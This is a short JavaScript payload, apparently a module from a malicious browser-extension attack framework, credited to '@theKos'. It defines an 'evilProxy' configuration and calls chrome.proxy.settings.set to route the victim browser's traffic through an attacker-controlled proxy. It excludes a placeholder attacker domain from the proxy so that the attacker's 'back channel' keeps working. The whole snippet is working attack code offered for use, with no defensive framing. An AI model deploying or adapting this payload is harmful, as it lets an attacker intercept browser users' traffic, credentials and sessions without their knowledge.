// by @theKos, requires proxy permission
// WARNING, COULD POTENTIALLY BREAK BACK CHANNEL
var evilProxy = {
    "mode": "fixed_servers",
    "rules": {
        "bypassList": ["<local>","ATTACKER_DOMAIN.COM"], // EXCLUDE BACK CHANNEL FROM PROXY
        "singleProxy": {
            "host": "localhost", // ATTACKER PROXY IP
            "port": 8080, // ATTACKER PROXY PORT
            "scheme": "http" // ATTACKER PROXY SCHEME
        }
    }
}

try {
   chrome.proxy.settings.set({value: evilProxy, scope: 'regular'},function() {__logEval('Proxy settings updated!');});
} catch (e){
   __logEval('error '+e);
}
